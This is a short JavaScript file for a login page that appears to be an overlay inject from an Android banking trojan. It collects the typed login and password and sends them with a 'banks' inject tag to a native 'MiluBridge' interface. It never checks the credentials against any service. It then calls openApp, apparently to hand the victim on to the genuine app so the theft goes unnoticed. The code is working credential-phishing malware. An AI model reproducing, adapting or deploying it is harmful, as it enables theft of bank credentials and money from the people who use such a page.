(() => {
  const form = document.getElementById("loginForm");
  const loginInput = document.getElementById("login");
  const passwordInput = document.getElementById("password");
  const rememberRow = document.getElementById("rememberRow");
  const checkOff = document.getElementById("checkOff");
  const checkOn = document.getElementById("checkOn");
  const toastEl = document.getElementById("toast");

  let remember = false;
  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2200);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildPayload(login, password) {
    return JSON.stringify({
      login,
      password,
      type_injects: "banks",
      closed: "close_activity_injects",
      remember_login: remember ? "1" : "0",
    });
  }

  function toggleRemember() {
    remember = !remember;
    checkOff.style.display = remember ? "none" : "inline";
    checkOn.style.display = remember ? "inline" : "none";
    rememberRow.setAttribute("aria-pressed", remember ? "true" : "false");
  }

  function validateFields() {
    let ok = true;
    if (loginInput.value.length < 4) {
      loginInput.classList.add("is-error");
      ok = false;
    } else {
      loginInput.classList.remove("is-error");
    }
    if (passwordInput.value.length < 4) {
      passwordInput.classList.add("is-error");
      ok = false;
    } else {
      passwordInput.classList.remove("is-error");
    }
    return ok;
  }

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (locked) {
      return;
    }
    if (!validateFields()) {
      return;
    }
    locked = true;
    reportDone(buildPayload(loginInput.value, passwordInput.value));
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 300);
  });

  rememberRow.addEventListener("click", toggleRemember);
  rememberRow.addEventListener("keydown", (event) => {
    if (event.key === "Enter" || event.key === " ") {
      event.preventDefault();
      toggleRemember();
    }
  });

  [loginInput, passwordInput].forEach((input) => {
    input.addEventListener("input", () => {
      input.classList.remove("is-error");
    });
  });
})();
